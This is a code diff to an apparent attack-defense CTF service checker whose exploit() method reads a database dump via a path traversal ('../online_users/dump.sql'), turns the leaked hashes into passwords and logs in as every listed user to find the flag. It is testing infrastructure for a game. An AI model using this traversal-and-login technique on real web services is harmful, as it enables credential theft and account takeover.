@@ -245,7 +245,9 @@ class testifyChecker(BaseChecker):
 
 
     def exploit(self):
-        if self.variant_id == 0:
+        if self.variant_id > 0:
+            raise EnoException("Wrong variant_id provided")
+        else:
             filename = '../online_users/dump.sql'
             profile = get_profile()
             username = profile['username']
@@ -264,27 +266,22 @@ class testifyChecker(BaseChecker):
             res = self.http_get(route, **kwargs)
             sql_string = res.content[27:-2].decode('ascii')
             user_list = tuple_string_to_list(sql_string)
-            tested = False
+            search_string = ""
             for i in user_list:
                 user = (i[1])[1:-1]
                 hash = (i[2])[2:]
-                if user == username:
-                    kwargs2 = {
-                        'data': {
-                            'username': user,
-                            'password': base64.b64encode(bytes.fromhex(hash)).decode('ascii'),
-                            'login': 'signin'
-                        }
-                    }
-
-                    res2 = self.http_post('/login', **kwargs2)
-                    if not self.search_flag(res2.text):
-                        raise BrokenServiceException("Resulting flag was found to be incorrect")
-                    tested = True
-            if not tested:
-                raise BrokenServiceException("flag not found")
-        else:
-            raise EnoException("Wrong variant_id provided")
+                kwargs2 = {
+                    'data': {
+                        'username': user,
+                        'password': base64.b64encode(bytes.fromhex(hash)).decode('ascii'),
+                        'login': 'signin'
+                    },
+                    'allow_redirects': True
+                }
+                res2 = self.http_post('/login', **kwargs2)
+                search_string += res2.text
+            if not self.search_flag(search_string):
+                raise BrokenServiceException("Resulting flag was found to be incorrect")
 
 
 
